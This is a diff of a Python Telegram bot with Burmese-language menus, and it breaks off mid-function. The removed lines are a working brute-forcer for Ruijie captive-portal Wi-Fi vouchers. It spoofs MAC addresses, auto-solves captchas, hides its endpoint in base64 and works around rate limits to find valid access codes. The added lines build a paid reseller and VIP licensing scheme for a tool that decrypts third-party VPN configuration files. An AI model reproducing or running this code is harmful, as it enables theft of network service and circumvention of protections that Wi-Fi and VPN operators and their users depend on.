+    if user_id == ADMIN_ID: return True
+    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
     try:
-        code_iter = iter_codes(mode)
-    except ValueError as e:
-        await bot.send_message(chat_id, str(e))
-        return
-    total = 10 ** int(mode) if mode in ["6", "7"] else None
-    checked = 0
-    last_key_check = time.monotonic()
-    scan_start = time.monotonic()
-    global _voucher_sem
-    if _voucher_sem is None:
-        _voucher_sem = asyncio.Semaphore(CONCURRENCY)
-
-    try:
-        while True:
-            current_task = scan_tasks.get(chat_id)
-            if not current_task or current_task.get("scan_id") != scan_id:
-                return
-            if current_task.get("stop"):
-                scan_tasks.pop(chat_id, None)
-                success_messages.pop(chat_id, None)
-                success_texts.pop(chat_id, None)
-                return
-
-            batch = []
-            for _ in range(BATCH_SIZE):
-                try:
-                    batch.append(next(code_iter))
-                except StopIteration:
-                    break
-            if not batch:
-                break
-
-            if time.monotonic() - last_key_check >= 600:
-                auth_list, _ = await get_file_content("auth_list.json")
-                if (
-                    str(chat_id) not in auth_list
-                    or not check_key_expiration(auth_list[str(chat_id)])
-                ):
-                    approve[chat_id] = False
-                    await bot.send_message(
-                        chat_id,
-                        "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။"
-                    )
-                    scan_tasks.pop(chat_id, None)
-                    success_messages.pop(chat_id, None)
-                    success_texts.pop(chat_id, None)
-                    return
-                last_key_check = time.monotonic()
-
-            async def _check(code):
-                async with _voucher_sem:
-                    return await perform_check(
-                        session_url, code, chat_id, scan_id, message=message
-                    )
-
-            await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
-
-            checked += len(batch)
-
-            elapsed = time.monotonic() - scan_start
-            speed = (checked / elapsed * 60) if elapsed > 0 else 0
-            found = len(success_texts.get(chat_id, []))
-            retries = retry_counts.get(chat_id, 0)
-            text = format_progress(checked, total, speed, found, retries)
-            try:
-                await bot.edit_message_text(
-                    chat_id=chat_id,
-                    message_id=progress_msg.message_id,
-                    text=text
-                )
-            except Exception:
-                try:
-                    new_msg = await bot.send_message(chat_id, text)
-                    progress_msg.message_id = new_msg.message_id
-                except Exception as err:
-                    print(f"Progress Message Error: {err}")
-
-        if progress_msg:
-            final_found = len(success_texts.get(chat_id, []))
-            final_retries = retry_counts.get(chat_id, 0)
-            finish_text = (
-                "🔍Scanning Completed\n\n"
-                f"📦Checked : {checked:,}\n"
-                f"✅Found : {final_found}\n"
-                f"🔁Retry : {final_retries}\n"
-                "📊Progress : 100%\n"
-                "[████████████████████]"
-            )
-            try:
-                await bot.edit_message_text(
-                    chat_id=chat_id,
-                    message_id=progress_msg.message_id,
-                    text=finish_text
-                )
-            except:
-                try:
-                    await bot.send_message(chat_id, finish_text)
-                except Exception as err:
-                    print(f"Progress Finish Message Error: {err}")
-        scan_tasks.pop(chat_id, None)
-        success_messages.pop(chat_id, None)
-        success_texts.pop(chat_id, None)
-        limited_messages.pop(chat_id, None)
-        limited_texts.pop(chat_id, None)
-        retry_counts.pop(chat_id, None)
+        cursor = conn.cursor()
+        cursor.execute("SELECT role FROM users WHERE tg_id = ? AND role = 'reseller'", (user_id,))
+        res = cursor.fetchone()
     finally:
-        scan_tasks.pop(chat_id, None)
-        success_messages.pop(chat_id, None)
-        success_texts.pop(chat_id, None)
-        limited_messages.pop(chat_id, None)
-        limited_texts.pop(chat_id, None)
-        retry_counts.pop(chat_id, None)
+        conn.close()
+    return res is not None
 
-
-def get_mac():
-    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
-    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
-    return ':'.join(f'{x:02x}' for x in mac)
-
-async def get_session_id(session, session_url, previous_session_id=None):
-    mac = get_mac()
-    session_url = replace_mac(session_url, new_mac=mac)
-    headers = {
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'accept-language': 'en-US,en;q=0.9',
-        'priority': 'u=0, i',
-        'referer': session_url,
-        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'document',
-        'sec-fetch-mode': 'navigate',
-        'sec-fetch-site': 'same-origin',
-        'upgrade-insecure-requests': '1',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
-        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
-    }
+def get_reseller_tokens(user_id):
+    if user_id == ADMIN_ID: return -1
+    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
     try:
-        async with session.get(session_url, headers=headers, allow_redirects=True) as req:
-            response = str(req.url)
-            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
-            if session_id:
-                return session_id.group(1)
-            else:
-                return previous_session_id
-    except:
-        print("Session ID Fetch Error")
-        return previous_session_id
+        cursor = conn.cursor()
+        cursor.execute("SELECT token_balance FROM users WHERE tg_id = ?", (user_id,))
+        res = cursor.fetchone()
+    finally:
+        conn.close()
+    return res[0] if res else 0
 
-def replace_mac(url, new_mac):
-    url = re.sub(r'(?<=mac=)[^&]+', new_mac, url)
-    return url
+def deduct_reseller_tokens_by_days(user_id, required_tokens):
+    if user_id == ADMIN_ID: return True
+    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
+    try:
+        cursor = conn.cursor()
+        cursor.execute("SELECT token_balance FROM users WHERE tg_id = ?", (user_id,))
+        res = cursor.fetchone()
+        if res:
+            tokens = res[0]
+            if tokens >= required_tokens:
+                new_balance = tokens - required_tokens
+                cursor.execute("UPDATE users SET token_balance = ? WHERE tg_id = ?", (new_balance, user_id))
+                conn.commit()
+                return True
+        return False
+    finally:
+        conn.close()
 
-async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
-    global _connector
-    if not recheck:
-        current_task = scan_tasks.get(chat_id)
-        if not current_task or current_task.get("scan_id") != scan_id:
-            return
+def is_vip_exists(target_id):
+    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
+    try:
+        cursor = conn.cursor()
+        cursor.execute("SELECT target_id FROM auth_keys WHERE target_id = ?", (str(target_id).strip(),))
+        res = cursor.fetchone()
+    finally:
+        conn.close()
+    return res is not None
 
-    post_url = base64.b64decode(
-        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
-    ).decode()
+def is_reseller_exists(tg_id):
+    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
+    try:
+        cursor = conn.cursor()
+        cursor.execute("SELECT tg_id FROM users WHERE tg_id = ? AND role = 'reseller'", (int(tg_id) if str(tg_id).isdigit() else 0,))
+        res = cursor.fetchone()
+    finally:
+        conn.close()
+    return res is not None
 
-    response = None
-    for _attempt in range(3):
-        timeout = aiohttp.ClientTimeout(total=30)
-
-        async with aiohttp.ClientSession(
-            connector=_connector,
-            connector_owner=False,
-            cookie_jar=aiohttp.CookieJar(),
-            timeout=timeout
-        ) as task_session:
-
-            session_id = await get_session_id(task_session, session_url, None)
-            if not session_id:
-                return
-
-            auth_code = None
-            for _ in range(8):
-                try:
-                    image = await Captcha_Image(task_session, session_id)
-                    text = await Captcha_Text(image)
-                    if not text:
-                        continue
-                    verified = await Varify_Captcha(task_session, session_id, text)
-                    if verified:
-                        auth_code = text
-                        break
-                except Exception as e:
-                    print(f"[perform_check] captcha error: {e}")
-            if not auth_code:
-                return
-
-            if not recheck:
-                current_task = scan_tasks.get(chat_id)
-                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
-                    return
-
-            data = {
-                "accessCode": code,
-                "sessionId": session_id,
-                "apiVersion": 1,
-                "authCode": auth_code,
-            }
-            headers = {
-                "authority": "portal-as.ruijienetworks.com",
-                "accept": "*/*",
-                "accept-language": "en-US,en;q=0.9",
-                "content-type": "application/json",
-                "origin": "https://portal-as.ruijienetworks.com",
-                "referer": (
-                    f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html"
-                    f"?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}"
-                ),
-                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
-                "sec-ch-ua-mobile": "?1",
-                "sec-ch-ua-platform": '"Android"',
-                "sec-fetch-dest": "empty",
-                "sec-fetch-mode": "cors",
-                "sec-fetch-site": "same-origin",
-                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
-            }
+def is_access_valid(user_id):
+    if is_admin(user_id): return True, "Main Admin 👑", "Unlimited ♾️"
+    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
+    current_date = datetime.utcnow() + timedelta(hours=7)
+    try:
+        cursor = conn.cursor()
+        # Check Reseller Expiry
+        cursor.execute("SELECT expire_date FROM users WHERE tg_id = ? AND role = 'reseller'", (user_id,))
+        res = cursor.fetchone()
+        if res:
+            exp_date = res[0]
+            fmt = "%d/%m/%Y" if '/' in exp_date else "%Y-%m-%d"
             try:
-                async with task_session.post(post_url, json=data, headers=headers) as req:
-                    response = await req.text()
-                    resp_json = json.loads(response)
-                    print(f"[voucher] code={code} attempt={_attempt+1} status={req.status} resp={resp_json}")
-            except Exception as e:
-                print(f"[perform_check] error: {e}")
-                return
+                if datetime.strptime(exp_date, fmt).date() >= current_date.date():
+                    return True, "Reseller Staff 💼", exp_date
+            except: pass
+        
+        # Check VIP Expiry
+        cursor.execute("SELECT unit_val, created_at FROM auth_keys WHERE target_id = ?", (str(user_id),))
+        vip_res = cursor.fetchone()
+        if vip_res:
+            months = int(vip_res[0])
+            c_at = vip_res[1]
+            fmt = "%d/%m/%Y" if '/' in c_at else "%Y-%m-%d"
+            try:
+                exp_date_obj = datetime.strptime(c_at, fmt) + timedelta(days=months*30)
+                if exp_date_obj.date() >= current_date.date():
+                    return True, "VIP User ✨", exp_date_obj.strftime("%d/%m/%Y")
+            except: pass
+    finally:
+        conn.close()
+    return False, "Expired or Not Found", "-"
 
-        if response and 'request limited' in response:
-            print(f"[perform_check] rate limited on code={code}, retrying (attempt {_attempt+1}/3)")
-            retry_counts[chat_id] = retry_counts.get(chat_id, 0) + 1
-            continue
-        break
+# ==========================================
+# TELEGRAM MENU INTERFACE
+# ==========================================
+@bot.message_handler(commands=['start', 'help'])
+def send_welcome(message):
+    user_id = message.from_user.id
+    user_states[user_id] = None
+    pull_data_from_google_sheet()
+    
+    first_name = message.from_user.first_name
+    bot_name = bot.get_me().first_name
 
-    if not response:
+    valid, role_str, exp_date = is_access_valid(user_id)
+
+    if not valid:
+        welcome_text = f"👋 <b>{bot_name} မှ ကြိုဆိုပါတယ်!</b>\n\n" \
+                       f"📊 <b>အကောင့်အခြေအနေ:</b>\n" \
+                       f"👑 အဆင့်အတန်း: <b>Normal User 🙂</b>\n" \
+                       f"👤 အမည်: <b>{first_name}</b>\n" \
+                       f"🆔 Telegram ID: <code>{user_id}</code>\n\n" \
+                       f"⚠️ သင်သည် ခွင့်ပြုထားသော Reseller/VIP မဟုတ်ပါ (သို့မဟုတ်) သက်တမ်းကုန်ဆုံးသွားပါပြီ။ Admin ထံသို့ ဆက်သွယ်နိုင်ပါသည်။"
+        bot.reply_to(message, welcome_text, reply_markup=get_menu_markup(user_id), parse_mode="HTML")
+        return bot.send_message(message.chat.id, "👇 Admin အား ဆက်သွယ်ရန် ခလုတ်ကိုနှိပ်ပါ-", reply_markup=get_admin_contact_markup())
+
+    tokens_line = ""
+    if is_admin(user_id):
+        tokens_line = "🪙 Credit Balance: <code>Unlimited ♾️</code>\n"
+    elif is_reseller(user_id):
+        tokens_line = f"🪙 Credit Balance: <code>{get_reseller_tokens(user_id)}</code> Tokens\n"
+
+    welcome_text = f"👋 <b>{bot_name} မှ ကြိုဆိုပါတယ်!</b>\n\n" \
+                   f"📊 <b>အကောင့်အခြေအနေ:</b>\n" \
+                   f"👑 အဆင့်အတန်း: <b>{role_str}</b>\n" \
+                   f"👤 အမည်: <b>{first_name}</b>\n" \
+                   f"🆔 Telegram ID: <code>{user_id}</code>\n" \
+                   f"{tokens_line}" \
+                   f"⏳ သက်တမ်းကုန်ဆုံးမည့်ရက်: <code>{exp_date}</code>\n\n" \
+                   f"💡 အောက်ပါ Panel Keyboard ကို အသုံးပြုပြီး လုပ်ငန်းများကို ဆောင်ရွက်နိုင်ပါသည်။"
+    
+    bot.reply_to(message, welcome_text, reply_markup=get_menu_markup(user_id), parse_mode="HTML")
+
+# ==========================================
+# MY BALANCE BUTTON ENGINE
+# ==========================================
+@bot.message_handler(func=lambda msg: msg.text == "💰 My Balance")
+def handle_balance_click(message):
+    user_id = message.from_user.id
+    pull_data_from_google_sheet()
+    
+    valid, role_str, exp_date = is_access_valid(user_id)
+    
+    if is_admin(user_id):
+        res = f"💰 <b>သင့်ရဲ့ လက်ကျန် Balance အခြေအနေ:</b>\n\n" \
+              f"👑 အဆင့်အတန်း: <b>Main Admin 👑</b>\n" \
+              f"🆔 TG ID: <code>{user_id}</code>\n" \
+              f"🪙 လက်ကျန် Credit: <code>Unlimited ♾️</code>"
+        return bot.reply_to(message, res, reply_markup=get_menu_markup(user_id), parse_mode="HTML")
+        
+    elif is_reseller(user_id):
+        current_tokens = get_reseller_tokens(user_id)
+        if not valid:
+            res = f"💰 <b>သင့်ရဲ့ လက်ကျန် Balance အခြေအနေ:</b>\n\n" \
+                  f"👑 အဆင့်အတန်း: <b>Reseller Staff 💼</b>\n" \
+                  f"🆔 TG ID: <code>{user_id}</code>\n" \
+                  f"🪙 လက်ကျန် Credit: <code>{current_tokens} Tokens</code>\n" \
+                  f"⏳ သက်တမ်း: <code>{exp_date} (Expired)</code>\n\n" \
+                  f"⚠️ သင့်အကောင့် သက်တမ်းကုန်ဆုံးနေပါသဖြင့် Admin ထံသို့ ဆက်သွယ်ပါ။"
+            bot.reply_to(message, res, reply_markup=get_menu_markup(user_id), parse_mode="HTML")
+            return bot.send_message(message.chat.id, "👇 Admin အား ဆက်သွယ်ရန် ခလုတ်ကိုနှိပ်ပါ-", reply_markup=get_admin_contact_markup())
+        else:
+            res = f"💰 <b>သင့်ရဲ့ လက်ကျန် Balance အခြေအနေ:</b>\n\n" \
+                  f"👑 အဆင့်အတန်း: <b>Reseller Staff 💼</b>\n" \
+                  f"🆔 TG ID: <code>{user_id}</code>\n" \
+                  f"🪙 လက်ကျန် Credit: <code>{current_tokens} Tokens</code>\n" \
+                  f"⏳ သက်တမ်းကုန်ဆုံးရက်: <code>{exp_date}</code>"
+            return bot.reply_to(message, res, reply_markup=get_menu_markup(user_id), parse_mode="HTML")
+            
+    else:
+        if not valid:
+            res = f"💰 <b>သင့်ရဲ့ လက်ကျန် Balance အခြေအနေ:</b>\n\n" \
+                  f"👑 အဆင့်အတန်း: <b>Normal User 🙂</b>\n" \
+                  f"🆔 TG ID: <code>{user_id}</code>\n" \
+                  f"⏳ သက်တမ်း: <code>Expired (ကုန်ဆုံး)</code>\n\n" \
+                  f"⚠️ သင့် VIP သက်တမ်းကုန်ဆုံးနေပါသဖြင့် Admin ထံသို့ ဆက်သွယ်ပါ။"
+            bot.reply_to(message, res, reply_markup=get_menu_markup(user_id), parse_mode="HTML")
+            return bot.send_message(message.chat.id, "👇 Admin အား ဆက်သွယ်ရန် ခလုတ်ကိုနှိပ်ပါ-", reply_markup=get_admin_contact_markup())
+        else:
+            res = f"💰 <b>သင့်ရဲ့ လက်ကျန် Balance အခြေအနေ:</b>\n\n" \
+                  f"👑 အဆင့်အတန်း: <b>VIP User ✨</b>\n" \
+                  f"🆔 TG ID: <code>{user_id}</code>\n" \
+                  f"⏳ သက်တမ်းကုန်ဆုံးရက်: <code>{exp_date}</code>"
+            return bot.reply_to(message, res, reply_markup=get_menu_markup(user_id), parse_mode="HTML")
+
+# ==========================================
+# GENERAL PANEL BUTTONS & DECRYPT
+# ==========================================
+@bot.message_handler(func=lambda msg: any(msg.text in row for row in ADMIN_BUTTONS + RESELLER_BUTTONS + USER_BUTTONS))
+def handle_menu_clicks(message):
+    user_id = message.from_user.id
+    text = message.text
+    pull_data_from_google_sheet()
+
+    valid, role_str, exp_date = is_access_valid(user_id)
+
+    if text == "🌐 VPN Decrypt List":
+        if not valid:
+            return bot.reply_to(message, "🚫 <b>ခွင့်ပြုချက် မရှိပါ (သို့မဟုတ်) သက်တမ်းကုန်နေပါသည်။</b>", reply_markup=get_admin_contact_markup(), parse_mode="HTML")
+            
+        configs = get_vpn_configs()
+        bot_name = bot.get_me().first_name
+        first_name = message.from_user.first_name
+        tokens_line = f"🪙 Credit Balance: <code>{get_reseller_tokens(user_id)}</code> Tokens\n" if is_reseller(user_id) and not is_admin(user_id) else ""
+
+        welcome_text = f"👋 <b>{bot_name} မှ\nနွေးထွေးစွာ ကြိုဆိုပါတယ်!</b>\n\n" \
+                       f"📊 <b>အကောင့်အခြေအနေ (Account Info):</b>\n" \
+                       f"👑 အဆင့်အတန်း: <b>{role_str}</b>\n" \
+                       f"👤 အမည်: <b>{first_name}</b>\n" \
+                       f"🆔 Telegram ID: <code>{user_id}</code>\n" \
+                       f"{tokens_line}" \
+                       f"⏳ သက်တမ်းကုန်မည့်ရက်: <code>{exp_date}</code>\n\n" \
+                       f"--- <b>Decrypt Configurations List</b> ---\n" \
+                       f"🛠️ Decrypt လုပ်ချင်တဲ့ VPN Config အမျိုးအစားကို အောက်မှာ ရွေးချယ်ပါ-"
+
+        markup = types.InlineKeyboardMarkup(row_width=2)
+        buttons = [types.InlineKeyboardButton(f"[{i}] {vpn['name']}", callback_data=f"dec_{vpn['id']}") for i, vpn in enumerate(configs, 1)]
+        for i in range(0, len(buttons), 2):
+            markup.row(*buttons[i:i+2])
+
+        return bot.reply_to(message, welcome_text, reply_markup=markup, parse_mode="HTML")
+
+    if text == "💰 My Balance":
+        return handle_balance_click(message)
+
+    # Restrict Reseller/Admin Menus
+    if text in ["➕ Add VIP User", "🔑 My VIP Users", "✏️ Edit VIP", "🗑 Delete VIP", "👤 Create Reseller", "📊 Reseller List", "✏️ Edit Reseller", "🗑 Delete Reseller", "🌐 View All VIPs"]:
+        if not is_reseller(user_id):
+            return bot.reply_to(message, "❌ <b>ခွင့်ပြုချက် မရှိပါ!</b>", reply_markup=get_admin_contact_markup(), parse_mode="HTML")
+        if not valid and not is_admin(user_id):
+            return bot.reply_to(message, "⚠️ <b>သင့်အကောင့် သက်တမ်းကုန်ဆုံးသွားပါပြီ!</b>\n\nAdmin ထံသို့ ဆက်သွယ်ပါ။", reply_markup=get_admin_contact_markup(), parse_mode="HTML")
+
+    if text == "➕ Add VIP User":
+        user_states[user_id] = "ADD_VIP_ID"
+        bot.reply_to(message, "👤 ထည့်သွင်းမည့် VIP အသုံးပြုသူ၏ <b>Telegram ID</b> ကို ရိုက်ထည့်ပေးပါ-", parse_mode="HTML")
+
+    elif text == "🔑 My VIP Users":
+        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
+        cursor = conn.cursor()
+        cursor.execute("SELECT target_id, key_string, unit_val, created_at FROM auth_keys WHERE added_by = ? AND target_id != ''", (user_id,))
+        rows = cursor.fetchall()
+        conn.close()
+        
+        if not rows: 
+            return bot.reply_to(message, "📭 သင် ထည့်သွင်းထားသော VIP အသုံးပြုသူ စာရင်းမရှိသေးပါ။")
+        
+        res = f"🔑 <b>သင် ထည့်သွင်းထားသော VIP စာရင်း ({len(rows)} ဦး):</b>\n\n"
+        for r in rows:
+            days = calculate_days(r[2])
+            try:
+                fmt = "%d/%m/%Y" if '/' in r[3] else "%Y-%m-%d"
+                exp = (datetime.strptime(r[3], fmt) + timedelta(days=days)).strftime("%d/%m/%Y")
+            except: exp = "Error"
+            res += f"🆔 Telegram ID: <code>{r[0]}</code> | 👤 Name: <code>{r[1]}</code> | 📅 Expired: <code>{exp}</code>\n"
+        bot.reply_to(message, res, parse_mode="HTML")
+
+    elif text == "✏️ Edit VIP":
+        user_states[user_id] = "EDIT_VIP_ID"
+        bot.reply_to(message, "✏️ ပြင်ဆင်မည့် VIP အသုံးပြုသူ၏ <b>Telegram ID</b> ကို ရိုက်ထည့်ပေးပါ-", parse_mode="HTML")
+
+    elif text == "🗑 Delete VIP":
+        user_states[user_id] = "DEL_VIP_ID"
+        bot.reply_to(message, "🗑 ဖျက်ထုတ်မည့် VIP အသုံးပြုသူ၏ <b>Telegram ID</b> ကို ရိုက်ထည့်ပေးပါ-", parse_mode="HTML")
+
+    elif text == "👤 Create Reseller":
+        if not is_admin(user_id): return
+        user_states[user_id] = "ADD_RES_ID"
+        bot.reply_to(message, "👤 ဖန်တီးမည့် Reseller ၏ <b>Telegram ID</b> ကို ရိုက်ထည့်ပေးပါ-", parse_mode="HTML")
+
+    elif text == "📊 Reseller List":
+        if not is_admin(user_id): return
+        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
+        cursor = conn.cursor()
+        cursor.execute("SELECT tg_id, username, token_balance, expire_date FROM users WHERE role = 'reseller' AND tg_id != ''")
+        rows = cursor.fetchall()
+        conn.close()
+        if not rows: return bot.reply_to(message, "📭 Reseller စာရင်း မရှိသေးပါ။")
+        res = f"📊 <b>Reseller စာရင်းအားလုံး ({len(rows)} ဦး):</b>\n\n"
+        for r in rows:
+            tk_display = "Unlimited ♾️" if r[2] == -1 else f"{r[2]} Tk"
+            res += f"🆔 TG ID: <code>{r[0]}</code> | 👤 Name: {r[1]}\n🪙 Token: {tk_display} | ⏳ Expired: {r[3]}\n\n"
+        bot.reply_to(message, res, parse_mode="HTML")
+
+    elif text == "✏️ Edit Reseller":
+        if not is_admin(user_id): return
+        user_states[user_id] = "EDIT_RES_ID"
+        bot.reply_to(message, "✏️ ပြင်ဆင်မည့် Reseller ၏ <b>Telegram ID</b> ကို ရိုက်ထည့်ပေးပါ-", parse_mode="HTML")
+
+    elif text == "🗑 Delete Reseller":
+        if not is_admin(user_id): return
+        user_states[user_id] = "DEL_RES_ID"
+        bot.reply_to(message, "🗑 ဖျက်ထုတ်မည့် Reseller ၏ <b>Telegram ID</b> ကို ရိုက်ထည့်ပေးပါ-", parse_mode="HTML")
+
+    elif text == "🌐 View All VIPs":
+        if not is_admin(user_id): return
+        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
+        cursor = conn.cursor()
+        cursor.execute("SELECT target_id, key_string, unit_val, created_at FROM auth_keys WHERE target_id != ''")
+        rows = cursor.fetchall()
+        conn.close()
+        if not rows: return bot.reply_to(message, "📭 VIP အကောင့် မရှိသေးပါ။")
+        res = f"🌐 <b>VIP အသုံးပြုသူ စာရင်းအားလုံး ({len(rows)} ဦး):</b>\n\n"
+        for r in rows:
+            days = calculate_days(r[2])
+            try:
+                fmt = "%d/%m/%Y" if '/' in r[3] else "%Y-%m-%d"
+                exp = (datetime.strptime(r[3], fmt) + timedelta(days=days)).strftime("%d/%m/%Y")
+            except: exp = "Error"
+            res += f"🆔 Telegram ID: <code>{r[0]}</code> | 👤 Name: <code>{r[1]}</code> | 📅 Expired: <code>{exp}</code>\n"
+        bot.reply_to(message, res, parse_mode="HTML")
+
+# ==========================================
+# DECRYPT CALLBACK HANDLER
+# ==========================================
+@bot.callback_query_handler(func=lambda call: call.data.startswith('dec_'))
+def handle_decrypt_callback(call):
+    chat_id = call.message.chat.id
+    user_id = call.from_user.id
+    
+    valid, _, _ = is_access_valid(user_id)
+    if not valid:
+        bot.answer_callback_query(call.id, "🚫 သင်သည် သက်တမ်း ကုန်ဆုံးသွားပြီ ဖြစ်သည်။")
+        bot.send_message(chat_id, "🚫 သင်သည် သက်တမ်း ကုန်ဆုံးသွားပြီ ဖြစ်သဖြင့် အသုံးပြု၍မရပါ။ Admin ထံ ဆက်သွယ်ပါ။", reply_markup=get_admin_contact_markup())
         return
 
-    if 'logonUrl' in response:
-        if recheck:
-            return code
+    vpn_id = call.data.split('_')[1]
+    configs = get_vpn_configs()
+    selected_vpn = next((item for item in configs if item["id"] == vpn_id), None)
+    if not selected_vpn: return
 
-        if chat_id not in success_texts:
-            success_texts[chat_id] = []
-        expire_date = await Code_Expires_Date(session_id)
-        success_texts[chat_id].append(f"🎫 {code}\n   {expire_date}")
-        code_line = "\n\n".join(success_texts[chat_id])
-        await SUCCESS_CODE.put({
-            "chat_id": chat_id,
-            "code": code
-        })
-        if message:
-            try:
-                if chat_id not in success_messages:
-                    sent = await bot.send_message(
-                        chat_id=message.chat.id,
-                        text=f"Success Codes:\n\n{code_line}"
-                    )
-                    success_messages[chat_id] = sent.message_id
-                else:
-                    try:
-                        await bot.edit_message_text(
-                            chat_id=message.chat.id,
-                            message_id=success_messages[chat_id],
-                            text=f"Success Codes:\n\n{code_line}"
-                        )
-                    except Exception as e:
-                        try:
-                            sent = await bot.send_message(
-                                chat_id=message.chat.id,
-                                text=f"Success Codes:\n\n{code_line}"
-                            )
-                            success_messages[chat_id] = sent.message_id
-                        except Exception as err:
-                            print(f"Success Fallback Error: {err}")
-            except Exception as e:
-                print(f"Success Message Error: {e}")
-    elif 'STA' in response:
-        if chat_id not in limited_texts:
-            limited_texts[chat_id] = []
-        expire_date = await Code_Expires_Date(session_id)
-        limited_texts[chat_id].append(f"⚠️ {code}\n   {expire_date}")
-        limited_line = "\n\n".join(limited_texts[chat_id])
-        if message:
-            try:
-                if chat_id not in limited_messages:
-                    sent = await bot.send_message(
-                        chat_id=message.chat.id,
-                        text=f"Limited Codes:\n\n{limited_line}"
-                    )
-                    limited_messages[chat_id] = sent.message_id
-                else:
-                    try:
-                        await bot.edit_message_text(
-                            chat_id=message.chat.id,
-                            message_id=limited_messages[chat_id],
-                            text=f"Limited Codes:\n\n{limited_line}"
-                        )
-                    except Exception as e:
-                        try:
-                            sent = await bot.send_message(
-                                chat_id=message.chat.id,
-                                text=f"Limited Codes:\n\n{limited_line}"
-                            )
-                            limited_messages[chat_id] = sent.message_id
-                        except Exception as err:
-                            print(f"Limited Fallback Error: {err}")
-            except Exception as e:
-                print(f"Limited Message Error: {e}")
-
-def Minute_to_Hour(total_minutes):
-    if total_minutes == 'Unknown':
-        return 'Unknown'
-    hours = int(total_minutes) // 60
-    minutes = int(total_minutes) % 60
-    if hours > 0 and minutes > 0:
-        return f"{hours}h {minutes}m"
-    elif hours > 0:
-        return f"{hours}h"
-    else:
-        return f"{minutes}m"
-
-async def Code_Expires_Date(session_id):
-    headers = {
-        'authority': 'portal-as.ruijienetworks.com',
-        'accept': 'application/json, text/javascript, */*; q=0.01',
-        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
-        'content-type': 'application/json;',
-        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId=04ecdc104a99406194f594057b21fd21&lang=en_US&redirectUrl=https://www.ruijienetwoacom&authTypeype=15',
-        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Linux"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
-        'x-requested-with': 'XMLHttpRequest',
-    }
+    status_msg = bot.send_message(chat_id, f"⏳ <b>{selected_vpn['name']} Config ကို Decrypt လုပ်နေပါတယ်...</b>", parse_mode="HTML")
     try:
-        timeout = aiohttp.ClientTimeout(total=15)
-        async with aiohttp.ClientSession(
-            connector=_connector,
-            connector_owner=False,
-            cookie_jar=aiohttp.CookieJar(),
-            timeout=timeout
-        ) as fresh_session:
-            async with fresh_session.get(
-                f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}',
-                headers=headers
-            ) as req:
-                respond = await req.json()
-                profile_name = respond.get('result', {}).get('profileName', 'Unknown')
-                totaltime = Minute_to_Hour(respond.get('result', {}).get('totalMinutes', 'Unknown'))
-                return f"📋 Plan: {profile_name} | ⏳ Time: {totaltime}"
+        result_json = perform_decryption(selected_vpn["url"], selected_vpn["outer_key"], selected_vpn["outer_delta"], selected_vpn["method"])
+        temp_file_path = f"{vpn_id}_decrypted.json"
+        with open(temp_file_path, 'w', encoding='utf-8') as f:
+            json.dump(result_json, f, indent=4, ensure_ascii=False)
+            
+        bot.delete_message(chat_id, status_msg.message_id)
+        with open(temp_file_path, 'rb') as doc:
